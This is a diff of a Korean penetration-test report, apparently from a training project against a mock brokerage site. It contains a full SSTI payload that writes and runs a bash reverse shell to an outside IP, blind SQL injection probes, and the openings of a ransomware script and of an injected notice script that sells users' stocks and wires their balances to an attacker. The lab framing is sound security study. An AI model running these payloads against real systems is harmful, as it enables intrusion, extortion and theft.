@@ -56,13 +56,17 @@ sidebar:
 | 4 | 악성 앱 배포를 통한 모바일 탈취 시나리오 | 검색 기능에서 Blind SQL Injection을 통해 관리자의 로그인 정보를 탈취한 후 암호화된 password를 복호화해서 admin 계정 탈취 후 공지사항 페이지에 악성 앱을 배포 해 모바일 장악 시도 | 1. SQL Injection으로 관리자의 로그인 정보 탈취 <br> 2. 레인보우 테이블을 이용한 패스워드 크래킹 <br> 3. 악성 앱 다운로드 유도하는 공지사항 작성 <br> 4. 사용자의 중요 정보 장악 시도 |
 
 # 수행 결과
+
 ## S-1 시스템 침투 랜섬웨어 감염 시나리오
+
 ### 특정 페이지에서 SSTI 취약점 유무를 확인
 - 검색창에 T(java.lang.Runtime).getRuntime().exec(”id")를 입력해서 Thymleaf 구 버전에서 발생하는 SSTI 취약점이 존재함을 확인한다.
-><img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7625f76d-142d-44e0-8248-2350447edada">
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7625f76d-142d-44e0-8248-2350447edada">
 
 ### SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입
 - 취약점이 존재하는 부분, 즉 커뮤니티 검색창에 리버스 쉘을 작성하는 코드를 작성하여 서버에서 실행시킨다.
+
 ```
 T(java.lang.Runtime).getRuntime().exec(new String[] {"sh", "-c","echo '#!/bin/bash\nattacker_ip=51.21.82.80\nattacker_port=8888\n/bin/bash -c /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 ' > ReverseShell.sh && chmod a+x ReverseShell.sh && ./ReverseShell.sh"})
 ```
@@ -78,11 +82,13 @@ T(java.lang.Runtime).getRuntime().exec(new String[] {"sh", "-c","echo '#!/bin/ba
 > <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e37bb46b-62be-4440-a5fa-81ee8bc01f13">
 
 ### 수집한 정보를 바탕으로 랜섬웨어 코드를 작성
+
 - 수집한 서버, 데이터베이스 정보를 바탕으로 서버 정보를 암호화하고 데이터베이스를 백업해 가져온 후 서버에서 삭제하는 랜섬웨어 코드를 작성한다.
 
-<img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/98ec2acf-bbed-49ae-b7a2-da446fdca63e">
+> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/98ec2acf-bbed-49ae-b7a2-da446fdca63e">
 
 - 다음은 공격에 사용한 DB데이터 랜섬웨어 소스코드이다.
+
 ```
 #!/bin/bash
 
@@ -175,6 +181,7 @@ echo "
 ```
 
 ### 랜섬웨어 코드를 서버에 업로드 
+
 - 일련의 명령어를 통해 netcat을 이용하여 랜섬웨어 코드를 서버에 업로드한다.
 
 > <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/de1d73db-fc9b-470e-8fd2-77c23d7fae8f">
@@ -187,6 +194,7 @@ echo "
 
 
 ### 랜섬웨어 코드로 서버 정보 암호화 및 db백업 후 삭제 진행
+
 - 랜섬웨어 코드를 실행하여 서버 정보를 암호화하고 데이터베이스를 백업한 후에, 해당 데이터를 서버에서 삭제한다.
 
 > <img width="475" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a816d117-5651-4b15-a2ec-db156dc0f1bf">
@@ -197,12 +205,15 @@ echo "
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/91be8c6e-88bd-481b-afd0-387b1a79d0eb">
 
 ### 랜섬 메시지 남김
+
 - 랜섬웨어 공격을 통해 서버에 페이지를 생성하여 랜섬 메시지를 남긴다. 이를 통해 서버 관리자에게 요구사항을 알리고 사용자들에게 경고를 전달할 수 있다.
 
 > <img width="255" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8ffef4ca-d9f9-4151-b502-683e41a1957f">
 
 ## S-2 코인 채굴 시나리오
+
 ### Log4j 취약점을 이용해 쉘 권한 획득
+
 - Log4j 취약점은 Apache 로그 라이브러리에서 발견된 보안 취약점으로, 이를 이용하면 악의적인 코드를 실행할 수 있는 원격 코드 실행(RCE)이 가능하다. 공격자는 이를 이용하여 원격으로 AWS EC2 인스턴스에 접근한다.
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/19b5e615-bb54-4535-99ec-4c74ec0b42f4">
@@ -214,6 +225,7 @@ echo "
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/948d5d1c-749d-4c4d-a8fa-6121127f11ea">
 
 ### Shell 권한을 얻은 EC2에서 엑세스 키 탈취
+
 - EC2 인스턴스에 접근하면, 시스템에서 쉘 권한을 획득합니다. 이를 통해 시스템 내에서 명령어를 실행하고, AWS Command Line Interface(AWS CLI)를 사용하여 AWS 계정에 대한 액세스 키를 탈취한다.
 
 <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/075c08d3-4073-43e5-988b-b59ae990427b">
@@ -221,11 +233,13 @@ echo "
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/db57f153-a607-4a54-98fa-9036b15b0986">
 
 ### AWS CLI를 통해 키 탈취
+
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/edeef47e-bbc5-4a5b-b46b-91bbc6533cd9">
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/16f87ef8-b04d-4295-98a2-b0f38aaaaad7">
 
 ### AWS CLI를 통해 EC2 생성
+
 - 획득한 액세스 키를 사용하여 AWS CLI를 실행하여 새로운 EC2 인스턴스를 생성한다. 생성된 인스턴스에 원격으로 접속하여 제어할 수 있는 환경을 구축한다. 이를 통해 AWS 인프라 내에서 자유롭게 활동할 수 있다.
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e5162460-b07d-4052-952d-cdb84ece84e9">
@@ -233,12 +247,15 @@ echo "
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/ff6e8ce8-46cd-4ec8-b5da-8ad407e9de79">
 
 ### 생성한 EC2에 접속
+
 - 생성한 EC2에 접속한다.
+
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/adbd2bf0-8ac7-47ed-a939-7d5b835f0301">
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/1e93e42e-cd66-4f53-8b38-e2cc549c650d">
 
 ### 비트코인 채굴 코드 준비
+
 - EC2 인스턴스에 접속한 후 비트코인 채굴을 위한 코드를 인스톨 한다. 이 코드는 EC2 인스턴스의 리소스를 사용하여 비트코인을 채굴하기 위한 것이다.
 
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/9a5aaf3e-0c3f-47bd-821b-85eb466e4f9a">
@@ -246,13 +263,16 @@ echo "
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/9b67fb8d-e998-4618-b8f0-fd532e735eec">
 
 - 채굴 진행
+
 > <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/3d3cef79-a7c2-4b03-9996-5a774b096c81">
 
 
 ## 악성 앱 배포를 통한 모바일 탈취 시나리오
+
 - 악성 앱 배포를 통한 모바일 탈취 시나리오는 SQL Injection 취약점을 활용한 시나리오이다. SQL Injection 취약점은 악의적인 SQL 코드가 실행되게 함으로써 데이터베이스 시스템을 조작하는 보안 취약점이다. 이 취약점을 통해 공격자는 데이터베이스에서 데이터를 조회, 삭제, 수정할 수 있으며 궁극적으로는 전체 시스템에 대한 제어권을 획득할 수도 있다.
 
 ### 1차 정보 수집
+
 - 루키증권 웹사이트의 종목 검색 기능에서 SQL Injection 취약점을 확인한다. 참인 쿼리를 넣었을 때는 검색 결과가 정상적으로 나오는 것을 확인할 수 있다.
 
 | 입력 구문 (참) |
@@ -265,6 +285,7 @@ echo "
 <br>
 
 - 거짓인 쿼리를 넣었을 때는 검색 결과가 없는 것을 보아 Blind SQL Injection에 취약한 것을 알 수 있다.
+
 | 입력 구문 (거짓) |
 |---------|
 | a%’ and 1=1 and ‘%1%’=’%2 |
@@ -272,6 +293,7 @@ echo "
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/69634c34-5f65-46ca-9bc1-bdaa0d58445e">
 
 ### DB 내 정보 탈취
+
 - 루키증권 웹사이트의 종목 검색 기능에 Blind SQL Injection 자동화 스크립트를 적용하여 DB 내 테이블 정보를 탈취하고 Users 테이블에 대한 컬럼을 탈취한다.
 
 > <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/fdffdf3e-6503-4a60-90e1-9ea723c43d18">
@@ -288,6 +310,7 @@ echo "
 
 
 ### 관리자 계정 접근
+
 - 탈취한 데이터 중 비밀번호는 SHA256으로 단방향 암호화되어 있으므로, 레인보우 테이블을 기반으로 한 패스워드 크래킹을 진행하여 비밀번호를 복호화 한다.
 
 > <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e406f6c3-7928-4817-a794-507f2cbcab7f">
@@ -315,6 +338,7 @@ echo "
 - 사용자가 공지사항에서 악성 앱을 다운로드 받아 설치한다.
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/6f006475-df3c-4d59-b51b-b25a401928b5">
+
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/1fe75373-65f7-4545-8242-90409e4b8018">
 
 - 공격자의 컴퓨터에 접속해서 8888포트를 열고 사용자가 악성 앱을 다운로드하고 실행해서 리버스 쉘이 연결되기를 기다린다.
@@ -386,6 +410,7 @@ echo "
 - 탈취한 관리자 계정을 이용하여 문의게시판에 접근한다.
 
 ### 2차 정보 수집
+
 - 공지사항 게시판에서 CSRF 취약점이 있는 것을 확인한다. 공지사항 페이지에서 공지사항 글쓰기 폼을 가져와서 글 내용에 포함시켜서 글을 작성해 보면 글쓰기 폼이 작성되는 것을 확인할 수 있다.
 
 > <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/abd4367e-bb3a-41be-992d-6ed0fe6f1100">
@@ -399,12 +424,15 @@ echo "
 - 이를 바탕으로 글을 확인한 사용자의 RSA 키와 보유 주식 수, 계좌 잔액을 가져오는 스크립트 작성한다.
 
 ### E2E 우회
+
 - 글을 확인한 사용자의 RSA 키와 보유 주식 수까지 확인할 수 있는 스크립트와 계좌 잔액을 확인할 수 있는 스크립트를 작성하면 확인이 가능하다.
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7b189253-4adb-477e-b765-bedf6482f418">
 
 ### 최종 공격 수행
+
 - 공지사항을 통해 공지사항 글을 확인한 모든 사용자의 보유 주식을 판매하고 계좌의 잔액을 전부 해커에게 송금하는 스크립트를 작성한 후 공지사항을 게시한다.
+
 
 ```
 <script src="/js/jquery.min.js"></script>
@@ -586,6 +614,9 @@ async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
 - 코드를 포함한 공지사항을 작성한 뒤 업로드하고 일반 사용자가 공지사항을 확인한다. 그러면 사용자의 보유 주식이 전부 판매되고 계좌 잔액이 모두 공격자에게 송금된다.
 
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e60c99ea-f416-4705-967b-0dd3b07e51a7">
+
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/787a0cba-8862-4998-8a93-c4c9212db8f2">
+
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/200b5e42-fcb3-4fe9-b9c2-17e1e6fbef8f">
+
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/c767f00b-e5de-4eb3-9697-bc19d816c01a">
